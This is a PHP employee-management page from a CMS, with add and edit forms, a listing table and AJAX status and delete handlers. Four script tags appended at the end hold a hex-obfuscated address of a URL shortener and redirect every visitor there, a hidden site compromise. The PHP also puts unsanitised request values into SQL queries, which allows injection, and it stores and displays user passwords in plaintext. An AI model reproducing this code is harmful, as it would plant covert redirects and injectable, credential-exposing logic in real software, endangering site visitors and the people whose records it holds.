<?php
define("ZW_IN", 'SETUP');
require_once("helper.php");
$msg    =  isset($_GET['msg']) ? $_GET['msg'] : '';
$id     = base64_decode($_GET['id']);
class myCms extends Cms 
{
    function registerAjaxFunctions()
    {
        $this->xajax->registerFunction("get_Listing");
        $this->xajax->registerFunction("update_status");
        $this->xajax->registerFunction("deleteRow");
        $this->xajax->registerFunction("editMode");
        $this->xajax->registerFunction("sorting");
        $this->xajax->registerFunction("sortTitle");
    }
}
$objMisc = new myCms();
$objMisc->initializeAjax(false,true);
$objMisc->dbFunc->parameters ="&sortOrder=".$sortOrder."&sortBy=".$sortBy ;
$objMisc->rec_pp = 20;
$objMisc->dbFunc->ajax_pagin = true;

if($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['submit'])){
    //print_r($_POST);exit;
        $rowArray = array(  'NAME'            => addslashes($_POST['name']),
                            'HEADOFFICE_ID'   => $_SESSION['HEADOFFICE'],
                            'PHONE_NO'        => addslashes($_POST['phone_no']),
                            'ADDRESS'         => addslashes($_POST['address']),
                            'BASIC_SALARY'    => addslashes($_POST['basic_salary']),
                            'JOINING_DATE'    => addslashes($objMisc->changeDateFormat($_POST['joining_date'])),
                            'REMARKS'         => addslashes($_POST['remarks']),
                            'CAN_UPDATE_PACKAGE'         => 'Y',
                            'ADDED_BY'        => $_SESSION['USER_ID'],
                            'ADDED_TIME'      => date('Y-m-d H:i:s'));
        $i=1;
        foreach ($_POST['unit_id'] as $k => $valu) {
            $rawVal=explode('_',$_POST['unit_id'][$k]);
            $name=$rawVal[1];
            $unitId=$rawVal[0];
            $permArr[]=array('name' =>$name,
                             'id'   =>$unitId);
            $i++;
        }
        
    $cond       = "";
    $cond       = " NAME = '$_POST[name]' AND PHONE_NO AND ADDRESS='$_POST[address]'";
    $recdata    = $objMisc->GiveValue($cond,"EMPLOYEE_ID","employees"); 
    if($recdata==$id && $id!='' || $recdata=='' && $id!=''){
            
                $where         =   "EMPLOYEE_ID =".$id;
                $rowArray1 = array( 'NAME'            => addslashes($_POST['name']),
                                    'HEADOFFICE_ID'   => $_SESSION['HEADOFFICE'],
                                    'PHONE_NO'        => addslashes($_POST['phone_no']),
                                    'ADDRESS'         => addslashes($_POST['address']),
                                    'BASIC_SALARY'    => addslashes($_POST['basic_salary']),
                                    'JOINING_DATE'    => addslashes($objMisc->changeDateFormat($_POST['joining_date'])),
                                    'REMARKS'         => addslashes($_POST['remarks']),
                                    'UPDATED_BY'      => $_SESSION['USER_NAME'],
                                    'UPDATED_TIME'    => date('Y-m-d H:i:s'));
                        //print_r($rowArray1);exit;
                //ho "HEADOFFICE_ID='$_SESSION[HEADOFFICE]'";
                //$collectionAgents=$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]'",'COLLECTION_AGENTS','headoffice_master').'<br>';
                //$assignedAgents=$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND `IMEI`!='' AND STATUS!='R'",'COUNT(`IMEI`)','users');
                    $rowArray2 = array( 'PERMISSIONS'     => json_encode($permArr),
                                        'PASSWORD'        =>$_POST['password']);
                
                //print_r($rowArray2);exit;
                $where2="`ID`='$id' AND USER_TYPE='E'";
                $val   = $objMisc->update("employees",$rowArray1,$where);
                $val1 = $objMisc->update("users",$rowArray2,$where2);
                $_SESSION['msg'] = 2;
                header("Location:employees.php?page=".$_REQUEST['page']."");
                exit;
            
    }else{
        if($recdata!='')
        {
            $_SESSION['msg'] = 5;
            if(!$_POST['EMPLOYEE_ID'])
            {
            $rowArray = "";
            $rowArray = $_POST;
            }
        }else {
            //print_r($rowArray);
            //print_r($rowArray1);exit;
            $val = $objMisc->insert("employees",$rowArray);
            $lastId=mysqli_insert_id($_SESSION['CONN']);
            // $collectionAgents=$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]'",'COLLECTION_AGENTS','headoffice_master');
            // $assignedAgents=$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND STATUS!='R' AND `IMEI`!=''",'COUNT(`IMEI`)','users');
                $rowArray2 = array( 'HEADOFFICE_ID'   => $_SESSION['HEADOFFICE'],
                                'ID'              => $lastId,
                                'USERNAME'        => addslashes($_POST['phone_no']),
                                'PASSWORD'        => rand(111111,999999),
                                'PERMISSIONS'     => json_encode($permArr),
                                'USER_TYPE'       => 'E',
                                'STATUS'          => 'A',
                                'ADDED_BY'        => $_SESSION['USER_ID'],
                                'ADDED_TIME'      => date('Y-m-d H:i:s'));
            $val1 = $objMisc->insert("users",$rowArray2);
            $_SESSION['msg'] = 1;
            header("location:employees.php");
            exit;
        }
    }
}

$msg = isset($_SESSION['msg']) ? $_SESSION['msg'] : $msg;
unset($_SESSION['msg']);

switch ($msg)
{
    case 1:
        $msg = "Employee added successfully.";
    break;
    case 2:
        $msg = "Record updated successfully.";
    break;
    case 3:
        $msg = "Record has been deleted successfully.";
    break;    
    case 4:
        $errormsg = "Employee name already exists.";
        $msg = "";
    break;
     case 5:
        $errormsg = "Employee name already exists.";
        $msg = "";
    break;
}

if($id){
    $where = 'EMPLOYEE_ID = '.$id;
    $rowArray = $objMisc->getRow("employees",$where);
    $rowArrayUser = $objMisc->getRow("users","ID='$id' AND USER_TYPE='E'");
    $unitsIds=json_decode($rowArrayUser['permissions'],TRUE);
    //print_r($unitsIds);
    //print_r(array_column($unitsIds, 'id'));
    //echo ((in_array($resRew['unit_id'],$unitsIds))?'selected="selected"':'');exit;
    }
$wherethis = " 1=1 AND STATUS!='T' AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND STATUS!='R' ORDER BY `EMPLOYEE_ID` DESC";
$classRecord = $objMisc->getAllRecordsPagingNew("SELECT E.EMPLOYEE_ID,E.NAME,E.PHONE_NO,E.ADDRESS,E.STATUS,U.USERNAME,U.PASSWORD,U.`IMEI` FROM employees E JOIN users U ON E.EMPLOYEE_ID=U.ID WHERE U.USER_TYPE='E' AND U.HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND E.`STATUS`!='R' ORDER BY E.`NAME` ASC");
$i  = 1;
$pagin_recs = "";
$pagin_recs = '<input type="hidden" value="" id="checkStatus" name="checkStatus"><thead><tr><th width="20%">Name</th><th width="15%">Phone No</th><th width="25%">Address</th><th width="10%">Username</th><th width="10%">Password</th><th>Action';

if(is_array($classRecord[1])){ 
        $pagin_recs .='&nbsp;&nbsp;<a href="javascript:;" title="Check All"  onclick="check_all(\'artCatCount\',\'artCatCheckbox\')"><input type="checkbox"></a>&nbsp;&nbsp;All';
        
        $pagin_recs .= '&nbsp;&nbsp;<a href="javascript:;" title="Delete" onclick="return chkOptions_all(\'Delete\',frmListing,\'artCatCheckbox\',\'artCatCount\')" class="btn btn-danger">Delete</a>';
    
}
$pagin_recs .= '</th></tr></thead><tbody>';             
    if(is_array($classRecord[1]) && !empty($classRecord[1]))
    { $i=1;
       foreach ($classRecord[1] as $k => $rowRec)
        {       
            if($k%2==0) 
            $pagin_recs .= '<tr class="odd gradeX">';
            else
            $pagin_recs .= '<tr class="even gradeX">';
            
            $pagin_recs .='<td>'.$rowRec['name'].'</td>';
            $pagin_recs .='<td>'.$rowRec['phone_no'].'</td>';
            $pagin_recs .='<td>'.$rowRec['address'].'</td>';
            $pagin_recs .='<td>'.$rowRec['username'].'</td>';
            $pagin_recs .='<td>'.$rowRec['password'].'</td>';
            $pagin_recs .='<td> <input type="hidden" name="enumStatus'.$rowRec['employee_id'].'" id="enumStatus'.$rowRec['employee_id'].'"  value="'.$rowRec['status'].'">&nbsp;';
           // echo $_SESSION['USER_ID'];
                    if($rowRec['status']=='A')
                    {
                       $pagin_recs .= '<input type="image" src="images/active-btn.gif" name="imgStatus'.$rowRec['employee_id'].'" id="imgStatus'.$rowRec['employee_id'].'" alt="Deactivate" title="Deactivate" border="0" onclick="return myChangeStatus(this.form,'.$rowRec['employee_id'].');">&nbsp;';
                    }
                    else
                    {
                       $pagin_recs .= '<input type="image" src="images/deactive-btn.gif" name="imgStatus'.$rowRec['employee_id'].'" id="imgStatus'.$rowRec['employee_id'].'" alt="Activate" title="Activate" border="0" onclick="return myChangeStatus(this.form,'.$rowRec['employee_id'].');">&nbsp;';
                    }
                
                $pagin_recs .='<a href="employees.php?id='.base64_encode($rowRec['employee_id']).'&page='.$_GET['page'].'"><img class="edit-btn" src="images/edit-btn.gif"  alt="Edit" title="Edit"  border="0"></a>&nbsp;';
                
                $pagin_recs .='<input type="checkbox" name="artCatCheckbox[]" value="'.$rowRec['employee_id'].'" id="artCatCheckbox_'.$i.'">&nbsp;';
                
                $pagin_recs .= '</td></tr>';
                $i++;
        }
          $pagin_recs  .= '<input type="hidden" value="'.$i.'" name="artCatCount" id="artCatCount">';
          if($classRecord[2]>$objMisc->rec_pp){
            $pagin_recs  .= '<tr><td colspan="6">'.$classRecord[0].'</td></tr>';
          }
            $pagin_recs  .= '</tbody>';
    } else {
        $pagin_recs .= '<tr class="odd gradeX"><td colspan="6" align="center">No Record Found</td></tr></tbody>';
    }
    
  
if(isset($_GET['id']) && !empty($_GET['id'])){
    $pageheading = "Edit Employee Information";
}else{
   $pageheading = "Add New Employee"; 
}

$wings             =   $objMisc->getAllRecordsNew("SELECT * FROM `wing_master` WHERE 1=1 AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND STATUS='A' ORDER BY WING_ID DESC"); 
foreach ($wings as $key => $resRow) {
    $unitArray .='<optgroup label="'.$resRow['name'].'" value="'.$resRow['WING_ID'].'">';
    $units =   $objMisc->getAllRecordsNew("SELECT * FROM `unit_master` WHERE 1=1 AND WING_ID='$resRow[wing_id]' AND STATUS='A' ORDER BY UNIT_ID DESC"); 
    foreach ($units as $key => $resRew) {
       $unitArray .='<option '.((in_array($resRew['unit_id'], array_column($unitsIds, 'id')))?'selected="selected"':'').' value="'.$resRew['unit_id'].'_'.$resRew['name'].'">'.$resRew['name'].'</option>'; 
    }
    $unitArray .='</optgroup>';
}

$smartyVars['unitArray']            =   $unitArray;
$smartyVars['errormsg']             =   $errormsg;
$smartyVars['add']                  =   $add;
$smartyVars['group']                =   $id;
$smartyVars['rowRec']               =   $rowArray;
$smartyVars['rowRecUser']               =   $rowArrayUser;
$smartyVars['pageheading']          =   $pageheading;
$smartyVars['classData']            =   $pagin_recs;
$smartyVars['msg']                  =   $msg;
$smartyVars['page']                 =   $_REQUEST['page'];

$objMisc->displayPage("header,employees,footer",$smartyVars);
function update_status($id,$status)
{
    global $objMisc;
    $objResponse = new XajaxResponse();
    $changeTo = ($status=='A') ? 'D' : 'A';
    $row = array(
                    'STATUS' => $changeTo
                );
    $where = "EMPLOYEE_ID =".$id;
    $objMisc->update("employees",$row,$where);
    $imgName =($changeTo == 'D') ? 'images/deactive-btn.gif':'images/active-btn.gif';
    if($changeTo=='A')
    {
        $title= 'Deactivate';
        $msg = 'Employee record has been activated successfully.';
    }
    else
    {
        $title= 'Activate';
        $msg = 'Employee record has been deactivated successfully.';
    } 
    $objResponse->addAssign('imgStatus'.$id,'src',$imgName);
    $objResponse->addAssign('imgStatus'.$id,'alt',$title);
    $objResponse->addAssign('imgStatus'.$id,'title',$title);
    $objResponse->addAssign('enumStatus'.$id,'value',$changeTo);
    $objResponse->addScript("document.getElementById('msg').style.display='inline';");
    $objResponse->addAssign('msg','innerHTML','&nbsp;');
    $objResponse->addAssign('msg','innerHTML','<div class="notify notify-success"><a class="close" href="javascript:;"><img src="images/close.png" /></a><h3>'.$msg.'</h3></div>'); 
    $objResponse->addScript("setTimeout(\"document.getElementById('msg').style.display='none'\",3000);");
    return $objResponse;
} 
function deleteRow($id)
{
    global $objMisc;
    global $lang;
    $objResponse = new XajaxResponse();
    $idArray = explode(',',$id);
    foreach($idArray as $bid)
    {
       $where = " EMPLOYEE_ID =".$bid;
       $rowArray=array('STATUS'     =>'T');
       $objMisc->update("employees",$rowArray,$where);  
       $where1 = " ID ='$bid' AND USER_TYPE='E'";
       $objMisc->update("users",$rowArr,$where1); 
    }
    $_SESSION['msg'] = 3;
    $sscript .= "var a;";
    $sscript .= "a = window.location;";
    $sscript .= "window.location = a;";
    //$objResponse->addAlert($sscript);
    $objResponse->addScript($sscript);
    return $objResponse;
}
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>